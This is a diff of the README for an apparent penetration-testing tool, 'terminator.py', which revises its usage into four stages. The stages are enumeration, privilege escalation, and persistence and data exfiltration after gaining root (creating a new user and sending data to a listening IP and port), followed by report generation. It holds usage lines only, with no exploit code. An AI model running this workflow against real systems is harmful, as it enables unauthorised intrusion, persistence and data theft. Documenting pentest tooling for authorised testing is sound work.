@@ -17,17 +17,26 @@ terminator.py is used by itself and is comprised of enum.py, exfil.py, priv.py, 
 for this reason, you can either use terminator.py by itself, or use each of the other scripts individually. because terminator only automates the most common and simple penetration testing procedures, you will still need to put in some manual work if terminator is not successful. this tool is simply to speed up and automate the simple tasks.
 
 - clone the repository to your computer with "git clone https://github.com/suffs811/the-terminator.git"
-- if you choose to only download terminator.py, you will need to specify a directory wordlist for webpage enumeration (see terminator source code for details)
+- if you choose to only download terminator.py and not the entire repo, you will need to specify a directory wordlist for webpage enumeration (see terminator source code for details)
 
-<> note: for full terminator productivity, you will need to run the script three separate times: first on your local machine for enumeration, second on the target machine after gaining initial shell for exploitation, and third on your local machine again to compile the report.
+<>note: for full terminator productivity, you will need to run the script *four* separate times:
+first on your own machine, second time on the target machine after gaining initial shell, third time on target machine after gaining root privileges, and fourth time on your local machine to compile report.
 
 *for help with usage, use the -h flag or grep for 'usage' in the script (grep "usage" terminator.py)*
 
 # syntax
-- python3 terminator.py enum -t <target_ip_to_enumerate> (optional: -w <path_to_directory_wordlist> (otherwise, terminator will use default list))
+usage (stage 1-enumerating target from local machine):
+- python3 terminator.py enum -t <target_ip_to_enumerate>
+(optional: -w <path_to_directory_wordlist> (otherwise, terminator will use default list))
 
-- python3 terminator.py exploit -u <user's_username> -p <user's_passwd> -l <local_ip> -x <local_listening_port> (optional: -f (bypass root permissions check))
+usage (stage 2-privilege escalation after gaining shell on target machine):
+- python3 terminator.py priv
 
+usage (stage 3-persistence/data exfiltration after gaining root privileges on target machine):
+- python3 terminator.py root -u <new_user_name> -p <new_user_passwd> -l <local_ip> -x <local_listening_port>
+(optional: -f (bypass root permissions check))
+
+usage (stage 4-create report on local machine):
 - python3 terminator.py report -o <output_file_name>
 
 
